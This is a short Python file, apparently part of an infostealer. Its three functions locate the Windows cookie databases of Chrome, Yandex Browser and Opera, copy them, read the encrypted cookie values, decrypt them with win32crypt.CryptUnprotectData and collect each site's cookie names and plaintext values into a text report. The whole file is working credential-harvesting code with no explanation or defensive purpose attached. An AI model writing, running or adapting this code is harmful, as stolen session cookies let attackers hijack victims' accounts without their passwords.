# -*- coding: utf-8 -*-
import os
import sqlite3
import win32crypt
import shutil


def chrome():
    textc = "\n    CHROME COOKIES  "
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute('SELECT encrypted_value,host_key,name FROM Cookies;')

        for result in cursor.fetchall():
            cookies = win32crypt.CryptUnprotectData(result[0], None, None, None, 0)[1]
            if cookies:
               textc = textc + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + cookies.decode("utf-8")
    except:
        return "no chrome"


#print(textc)
    return(textc)


def yandex():
    texty =  "\n    YANDEX COOKIES   "
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute('SELECT encrypted_value,host_key,name FROM Cookies;')

        for result in cursor.fetchall():
            cookies = win32crypt.CryptUnprotectData(result[0], None, None, None, 0)[1]
            if cookies:
                texty = texty + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + cookies.decode("utf-8")
    except:
        return "no yandex"
    #print(texty)
    return(texty)


def opera():
    texto =  "\n    OPERA COOKIES   "
    try:
        if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Cookies'):
            shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Cookies', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Cookies2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Cookies2')
        cursor = conn.cursor()
        cursor.execute('SELECT encrypted_value,host_key,name FROM Cookies;')

        for result in cursor.fetchall():
            cookies = win32crypt.CryptUnprotectData(result[0], None, None, None, 0)[1]
            if cookies:
                texto = texto + "\n"+"url: "+result[1]+"  |  name: "+result[2]+"  |  data: " + cookies.decode("utf-8")
    except:
        return "no opera"
    #print(texto)
    return(texto)
